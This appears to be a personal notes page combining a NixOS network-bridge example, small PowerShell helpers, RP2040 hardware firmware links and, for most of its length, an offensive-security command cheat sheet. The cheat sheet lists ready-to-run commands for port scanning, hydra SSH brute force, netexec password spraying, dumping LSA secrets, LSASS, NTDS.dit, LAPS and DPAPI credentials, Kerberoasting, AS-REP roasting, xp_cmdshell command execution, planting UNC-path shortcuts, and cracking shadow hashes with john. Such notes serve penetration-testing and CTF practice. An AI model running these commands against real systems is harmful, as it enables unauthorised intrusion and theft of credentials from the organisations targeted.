---
layout: page
---

# Table of contents
<!-- TOC start (generated with https://github.com/derlin/bitdowntoc) -->

- [nixos](#nixos)
   * [network bridges](#network-bridges)
- [tools](#tools)
   * [nmap](#nmap)
   * [hydra](#hydra)
      + [ssh](#ssh)
   * [netexec](#netexec)
      + [smb](#smb)
      + [ftp](#ftp)
      + [ldap](#ldap)
      + [bloodhound](#bloodhound)
      + [mssql](#mssql)
   * [john the ripper](#john-the-ripper)
      + [yescrypt](#yescrypt)
- [powershell scripts](#powershell-scripts)
   * [decode base64](#decode-base64)
   * [open ports](#open-ports)
- [hardware](#hardware)
   * [RP 2040](#rp-2040)
      + [list of useful firmware](#list-of-useful-firmware)

<!-- TOC end -->

<!-- TOC --><a name="nixos"></a>
## nixos

<!-- TOC --><a name="network-bridges"></a>
### network bridges

Example:  
```nix
  networking.interfaces.eno1.useDHCP = true;
  networking.interfaces.virbr0.useDHCP = true;
  
  networking.bridges = {
    "virbr0" = {
      interfaces = [ "eno1" ];
    };
  };
```
If you use a firewall, also remember to add your interface to a trust group:
```nix
networking.firewall.trustedInterfaces = [ "virbr0" ];
```

<!-- TOC --><a name="tools"></a>
## tools

<!-- TOC --><a name="nmap"></a>
### nmap
- default
```sh
sudo nmap -sCV -T4 --min-rate 10000 {IP} -v -oA tcp_default
```
- udp
```sh
sudo nmap -sUCV -T4 --min-rate 10000 {IP} -v -oA udp_default
```

<!-- TOC --><a name="hydra"></a>
### hydra

<!-- TOC --><a name="ssh"></a>
#### ssh
```sh
hydra -v -V -u -l {Username} -P {Big_Passwordlist} -t 1 {IP} ssh
```
<!-- TOC --><a name="netexec"></a>
### netexec

<!-- TOC --><a name="smb"></a>
#### smb
- initial enumeration
```sh
netexec smb target
```
- null authentication
```sh
netexec smb target -u '' -p ''
```
- guest authentication
```sh
netexec smb target -u 'guest' -p ''
```
- list shares
```sh
netexec smb target -u '' -p '' --shares
```
```sh
netexec smb target -u username -p password --shares
```
- list usernames
```sh
netexec smb target -u '' -p '' --users
```
```sh
netexec smb target -u '' -p '' --rid-brute
```
```sh
netexec smb target -u username -p password --users
```
- local authentication
```sh
netexec smb target -u username -p password --local-auth
```
- using kerberos
```sh
netexec smb target -u username -p password -k
```
- password spray
```sh
netexec smb target -u users.txt -p password --continue-on-success
```
```sh
netexec smb target -u usernames.txt -p passwords.txt --no-bruteforce --continue-on-success
```
```sh
netexec ssh target -u username -p password --continue-on-success
```
- all in one
```sh
netexec smb target -u username -p password --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol
```
- spider_plus module
```sh
netexec smb target -u username -p password -M spider_plus
```
```sh
netexec smb target -u username -p password -k --get-file target_file output_file --share sharename
```
- dump a specific file
```sh
netexec smb target -u username -p password -k --get-file target_file output_file --share sharename
```
- dump lsa secrets
```sh
netexec smb target -u username -p password --local-auth --lsa
```
- group policy preferences
```sh
netexec smb target -u username -p password -M gpp_password
```
- dump laps v1 and v2 password
```sh
netexec smb target -u username -p password --laps
```
- dump dpapi credentials
```sh
netexec smb target -u username -p password --laps --dpapi
```
- dump ntds.dit
```sh
netexec smb target -u username -p password --ntds
```
- webdav - checks whether the webclient service is running on the target
```sh
netexec smb ip -u username -p password -M webdav 
```
- veeam - extracts credentials from local veeam sql database
```sh
netexec smb target -u username -p password -M veeam
```
- slinky - creates windows shortcuts with the icon attribute containing a UNC path to the specified SMB server in all shares with write permissions
```sh
netexec smb ip -u username -p password -M slinky 
```
- ntdsutil - dump ntds with ntdsutil
```sh
netexec smb ip -u username -p password -M ntdsutil
```
- dump lsass
```sh
netexec smb target -u username -p password -M lsassy
```
- retrieve msol account password
```sh
netexec smb target -u username -p password -M msol
```

<!-- TOC --><a name="ftp"></a>
#### ftp
- list folders and files
```sh
netexec ftp target -u username -p password --ls
```
- list files inside a folder
```sh
netexec ftp target -u username -p password --ls folder_name
```
- retrieve a specific file
```sh
netexec ftp target -u username -p password --ls folder_name --get file_name
```
<!-- TOC --><a name="ldap"></a>
#### ldap
- enumerate users using ldap
```sh
netexec ldap target -u '' -p '' --users
```
- all in one
```sh
netexec ldap target -u username -p password --trusted-for-delegation  --password-not-required --admin-count --users --groups
```
- kerberoast
```sh
netexec ldap target -u username -p password --kerberoasting kerb.txt
```
- asreproast
```sh
netexec ldap target -u username -p password --asreproast asrep.txt
```
- gmsa
```sh
netexec ldap target -u username -p password --gmsa-convert-id id
```
```sh
netexec ldap domain -u username -p password --gmsa-decrypt-lsa gmsa_account
```
- check the machine account quota
```sh
netexec ldap target -u username -p password -M maq
```
- adcs enumeration
```sh
netexec ldap target -u username -p password -M adcs
```

<!-- TOC --><a name="bloodhound"></a>
#### bloodhound
```sh
netexec ldap target -u username -p password --bloodhound -ns ip --collection All
```

<!-- TOC --><a name="mssql"></a>
#### mssql
- authentication
```sh
netexec mssql target -u username -p password
```
- execute commands using xp_cmdshell
```sh
netexec mssql target -u username -p password -x command_to_execute
```
> -X for powershell and -x for cmd

- get a file
```sh
netexec mssql target -u username -p password --get-file output_file target_file
```

source: https://github.com/seriotonctf/cme-nxc-cheat-sheet

<!-- TOC --><a name="john-the-ripper"></a>
### john the ripper

<!-- TOC --><a name="yescrypt"></a>
#### yescrypt
```sh
sudo unshadow passwd shadow > unshadow.txt && sudo john --format=crypt unshadow.txt -w=/usr/share/wordlists/rockyou.txt
```

<!-- TOC --><a name="powershell-scripts"></a>
## powershell scripts

<!-- TOC --><a name="decode-base64"></a>
### decode base64
```ps1
Get-Content base64.txt | %{[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($_))}
```

<!-- TOC --><a name="open-ports"></a>
### open ports
```ps1
$system_ports = Get-NetTCPConnection -State Listen

$text_port = Get-Content -Path C:\Users\Administrator\Desktop\ports.txt

foreach($port in $text_port){
    if($port -in $system_ports.LocalPort){
        echo $port
     }
  }
```

<!-- TOC --><a name="hardware"></a>
## hardware

<!-- TOC --><a name="rp-2040"></a>
### RP 2040

<!-- TOC --><a name="list-of-useful-firmware"></a>
#### list of useful firmware

- [DragonProbe](https://git.lain.faith/sys64738/DragonProbe)
> Adding Bus Pirate/..-style debugging & probing features to regular MCU boards such as the Raspberry Pi Pico

- [xvc-pico](https://github.com/kholia/xvc-pico)
> Raspberry Pico powered Xilinx Virtual Cable - Xilinx JTAG Cable! This is now quite fast, thanks to tom01h! We also support JTAG + serial terminal over a single cable now

- [pico-tpmsniffer](https://github.com/stacksmashing/pico-tpmsniffer)
> A simple, very experimental TPM sniffer for LPC bus